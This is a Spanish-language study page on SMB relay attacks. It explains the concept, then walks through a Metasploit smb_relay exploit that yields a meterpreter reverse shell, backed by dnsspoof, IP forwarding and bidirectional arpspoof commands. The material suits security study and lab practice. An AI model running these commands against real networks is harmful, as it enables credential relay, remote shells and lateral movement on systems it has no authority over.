# SMB relay attack

Un **SMB Relay Attack** es un tipo de ataque de red en el que un atacante **intercepta el tráfico SMB (Server Message Block)**, lo manipula y lo retransmite a un servidor legítimo para obtener acceso no autorizado a recursos o realizar acciones maliciosas. Este tipo de ataque es común en redes **Windows**, donde SMB se utiliza para compartir archivos, impresoras y otros servicios de red.

Funcionamiento de un ataque SMB Relay:

- **Intercepción:** El atacante se sitúa entre el cliente y el servidor (*Man-in-the-Middle*). Esto puede lograrse mediante técnicas como **ARP Spoofing**, **DNS Poisoning** o configurando un servidor SMB malicioso.
- **Captura de la autenticación:** Cuando el cliente se conecta al servidor mediante SMB, envía sus datos de autenticación. El atacante captura esta información, que puede incluir los **hashes NTLM (NT LAN Manager)**.
- **Retransmisión al servidor legítimo:** En lugar de descifrar el hash NTLM, el atacante lo retransmite a otro servidor que confía en el origen de la conexión, haciéndose pasar por el usuario autenticado.
- **Obtención de acceso:** Si el ataque tiene éxito, el atacante obtiene acceso a los recursos del servidor, como archivos, bases de datos o privilegios administrativos. Esto puede facilitar el movimiento lateral dentro de la red y comprometer otros sistemas.

## Explotación con metasploit

Establecemos el escenario de ataque con el exploit `smb_relay`:

```bash
msf > use exploit/windows/smb/smb_relay
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] Setting default action PSEXEC - view all 2 actions with the show actions command
[*] New in Metasploit 6.4 - The CREATE_SMB_SESSION action within this module can open an interactive session
msf exploit(windows/smb/smb_relay) > set srvhost <ip_kali> # suplanta la identidad del servidor
msf exploit(windows/smb/smb_relay) > set lhost <ip_kali> # suplanta la identidad del cliente
msf exploit(windows/smb/smb_relay) > set smbhost <ip_smb> # ip del servidor smb
msf exploit(windows/smb/smb_relay) > exploit
```

Creamos un archivo para suplantar los registros dns y comenzamos con el spoofing de dns:

```bash
echo "ip_kali *.dominio" > dns
dnsspoof -i eth1 -f dns
```

Habilitamos el *ip forwading* (redirección de IP):

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Iniciamos el arp spoofing en ambos sentidos:

```bash
arpspoof -i eth1 -t ip_cliente gateway
arpspoof -i eth1 -t gateway ip_cliente
```

Una vez establecido el entorno MitM, cuando el cliente inicie una conexión smb el exploit de `msfconsole` captura la sesión establecida y genera una sesión meterpreter.

> Nota: El Spoofing es una técnica mediante la cual un atacante falsifica su identidad o la información que envía para hacerse pasar por otro dispositivo, usuario o servicio.

[⟵ Anterior](../../05_sistema.md#explotación-windows)
